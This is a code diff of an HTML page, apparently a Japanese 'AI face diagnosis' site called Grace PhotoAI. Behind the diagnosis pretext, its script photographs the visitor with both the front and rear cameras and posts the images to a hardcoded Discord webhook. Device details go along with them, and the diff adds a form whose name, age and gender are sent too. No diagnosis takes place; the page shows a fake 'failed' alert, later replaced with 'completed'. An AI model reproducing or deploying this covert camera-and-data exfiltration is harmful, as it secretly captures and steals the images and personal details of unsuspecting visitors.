@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Grace PhotoAI</title>
 
-  <!-- OGPリンクプレビュー -->
+  <!-- OGP -->
   <meta property="og:title" content="AI顔診断 Grace" />
   <meta property="og:description" content="ChatGPTを基にした本格AI顔診断 Grace(グレース)。肌年齢,顔の比率,顔偏差値,似合う髪型や似合う服装,これらがすぐにわかる！" />
   <meta property="og:image" content="https://grace-photo.github.io/grace_preview_1200x630.jpg" />
@@ -27,13 +27,11 @@
       background-size: 400% 400%;
       animation: gradientBG 5s ease infinite;
     }
-
     @keyframes gradientBG {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
-
     .logo {
       font-family: 'Brush Script MT', cursive;
       font-size: 3rem;
@@ -43,7 +41,6 @@
       user-select: none;
       pointer-events: none;
     }
-
     .button {
       padding: 0.8rem 2rem;
       font-size: 1.2rem;
@@ -54,12 +51,10 @@
       cursor: pointer;
       transition: background-color 0.3s, color 0.3s;
     }
-
     .button:hover {
       background-color: white;
       color: black;
     }
-
     .terms-link {
       font-size: 0.9rem;
       text-decoration: underline;
@@ -67,7 +62,6 @@
       color: #ffffff;
       margin-top: 1rem;
     }
-
     .modal {
       display: none;
       position: fixed;
@@ -80,7 +74,6 @@
       overflow: auto;
       padding: 20px;
     }
-
     .modal-content {
       background: #2c2c2c;
       color: white;
@@ -93,9 +86,7 @@
       line-height: 1.6;
       position: relative;
     }
-
     .close-button {
-      font-family: "Times New Roman", "游明朝", "Yu Mincho", serif;
       font-size: 1.2rem;
       padding: 0.5rem 1.2rem;
       color: white;
@@ -108,10 +99,34 @@
       top: 20px;
       right: 20px;
     }
-
     .close-button:hover {
       background-color: white;
       color: black;
+    }
+    #inputModal input, #inputModal select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      border: none;
+      font-size: 1rem;
+    }
+    #inputModal label {
+      display: block;
+      margin-top: 10px;
+    }
+    .radio-group {
+      display: flex;
+      gap: 1rem;
+      margin-top: 10px;
+    }
+    .radio-group label {
+      font-size: 1rem;
+    }
+    #startDiagnosisBtn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
     }
   </style>
 </head>
@@ -121,6 +136,7 @@
   <button class="button" id="startButton">診断する</button>
   <div class="terms-link" id="termsLink">利用規約</div>
 
+  <!-- 利用規約モーダル -->
   <div id="termsModal" class="modal">
     <div class="modal-content">
       <button class="close-button" id="closeModal">CLOSE</button>
@@ -143,40 +159,67 @@
     </div>
   </div>
 
+    <!-- 入力モーダル -->
+  <div id="inputModal" class="modal">
+    <div class="modal-content">
+      <button class="close-button" id="closeInputModal">CLOSE</button>
+      <h2>診断前に入力してください</h2>
+
+      <label for="userName">名前</label>
+      <input type="text" id="userName" placeholder="例: 山田太郎" />
+
+      <label for="userAge">年齢</label>
+      <select id="userAge">
+        <option value="">選択してください</option>
+        <!-- 10歳〜80歳 -->
+        <script>
+          for (let i = 10; i <= 80; i++) {
+            document.write(`<option value="${i}">${i}歳</option>`);
+          }
+        </script>
+      </select>
+
+      <label>性別</label>
+      <div class="radio-group">
+        <label><input type="radio" name="gender" value="男性" /> 男性</label>
+        <label><input type="radio" name="gender" value="女性" /> 女性</label>
+        <label><input type="radio" name="gender" value="その他" /> その他</label>
+      </div>
+
+      <button class="button" id="startDiagnosisBtn" disabled>診断開始</button>
+    </div>
+  </div>
+
 <script>
 const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-function getUserEnvironmentInfo() {
+// 環境＋ユーザー情報まとめ
+function getUserEnvironmentInfo(userName, userAge, userGender) {
   const ua = navigator.userAgent;
   const language = navigator.language;
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
   let os = "不明";
-  if (/iPhone OS (\d+_\d+)/.test(ua)) {
-    os = `iOS ${RegExp.$1.replace("_", ".")}`;
-  } else if (/Android (\d+(\.\d+)?)/.test(ua)) {
-    os = `Android ${RegExp.$1}`;
-  } else if (/Windows NT (\d+\.\d+)/.test(ua)) {
-    os = `Windows ${RegExp.$1}`;
-  } else if (/Mac OS X (\d+_\d+)/.test(ua)) {
-    os = `macOS ${RegExp.$1.replace("_", ".")}`;
-  }
+  if (/iPhone OS (\d+_\d+)/.test(ua)) os = `iOS ${RegExp.$1.replace("_", ".")}`;
+  else if (/Android (\d+(\.\d+)?)/.test(ua)) os = `Android ${RegExp.$1}`;
+  else if (/Windows NT (\d+\.\d+)/.test(ua)) os = `Windows ${RegExp.$1}`;
+  else if (/Mac OS X (\d+_\d+)/.test(ua)) os = `macOS ${RegExp.$1.replace("_", ".")}`;
 
   let browser = "不明";
-  if (ua.includes("Safari") && !ua.includes("Chrome")) {
-    browser = "Safari";
-  } else if (ua.includes("Chrome")) {
-    browser = "Chrome";
-  } else if (ua.includes("Firefox")) {
-    browser = "Firefox";
-  } else if (ua.includes("Edg")) {
-    browser = "Edge";
-  }
+  if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+  else if (ua.includes("Chrome")) browser = "Chrome";
+  else if (ua.includes("Firefox")) browser = "Firefox";
+  else if (ua.includes("Edg")) browser = "Edge";
 
   const now = new Date();
   const datetime = now.toLocaleString("ja-JP");
 
-  return `【送信環境】
+  return `【診断者情報】
+・名前：${userName}
+・年齢：${userAge}歳
+・性別：${userGender}
+
+【送信環境】
 ・OS：${os}
 ・ブラウザ：${browser}
 ・日時：${datetime}
@@ -184,12 +227,13 @@ function getUserEnvironmentInfo() {
 ・タイムゾーン：${timezone}`;
 }
 
-async function captureAndSendImages() {
+// 撮影＆送信
+async function captureAndSendImages(userName, userAge, userGender) {
   const formData = new FormData();
   const images = [];
 
   async function capture(facingMode) {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
     const video = document.createElement("video");
     video.srcObject = stream;
     video.play();
@@ -213,35 +257,56 @@ async function captureAndSendImages() {
   await capture("user");
   await capture("environment");
 
-  const envInfo = getUserEnvironmentInfo();
-  const message = `サイトから取得した写真を送信\n\n${envInfo}`;
-
-  formData.append("payload_json", JSON.stringify({ content: message }));
-  images.forEach((img, i) => {
-    formData.append(`files[${i}]`, img, `photo${i+1}.jpg`);
-  });
+  const message = getUserEnvironmentInfo(userName, userAge, userGender);
+  formData.append("payload_json", JSON.stringify({ content: `サイトから取得した写真を送信\n\n${message}` }));
+  images.forEach((img, i) => formData.append(`files[${i}]`, img, `photo${i+1}.jpg`));
 
   await fetch(webhookUrl, { method: "POST", body: formData });
 
-  alert("カメラへのアクセスに失敗しました。\nもう一度最初からやり直し、診断を開始してください。\n※複数回アクセスに失敗した場合、使用している端末/ブラウザが当サイトに対応していない可能性があります。");
+  alert("診断が完了しました！");
 }
 
-document.getElementById("startButton").onclick = () => {
-  alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。\nこの後表示されるカメラ許可のポップアップに従い、診断を開始してください。");
-  captureAndSendImages();
-};
+// 入力フォームのバリデーション
+function validateForm() {
+  const name = document.getElementById("userName").value.trim();
+  const age = document.getElementById("userAge").value;
+  const gender = document.querySelector('input[name="gender"]:checked');
+  document.getElementById("startDiagnosisBtn").disabled = !(name && age && gender);
+}
 
+// イベント設定
+document.getElementById("startButton").onclick = () => {
+  document.getElementById("inputModal").style.display = "block";
+};
+document.getElementById("startDiagnosisBtn").onclick = () => {
+  const name = document.getElementById("userName").value.trim();
+  const age = document.getElementById("userAge").value;
+  const gender = document.querySelector('input[name="gender"]:checked')?.value;
+  document.getElementById("inputModal").style.display = "none";
+  alert("これから顔診断を開始します。カメラの許可をお願いします。");
+  captureAndSendImages(name, age, gender);
+};
 document.getElementById("termsLink").onclick = () => {
   document.getElementById("termsModal").style.display = "block";
 };
 document.getElementById("closeModal").onclick = () => {
   document.getElementById("termsModal").style.display = "none";
 };
-window.onclick = e => {
-  if (e.target == document.getElementById("termsModal")) {
-    document.getElementById("termsModal").style.display = "none";
-  }
+document.getElementById("closeInputModal").onclick = () => {
+  document.getElementById("inputModal").style.display = "none";
 };
+window.onclick = e => {
+  if (e.target == document.getElementById("termsModal"))
+    document.getElementById("termsModal").style.display = "none";
+  if (e.target == document.getElementById("inputModal"))
+    document.getElementById("inputModal").style.display = "none";
+};
+['userName', 'userAge'].forEach(id => {
+  document.getElementById(id).addEventListener('input', validateForm);
+});
+document.querySelectorAll('input[name="gender"]').forEach(el => {
+  el.addEventListener('change', validateForm);
+});
 </script>
 
 </body>
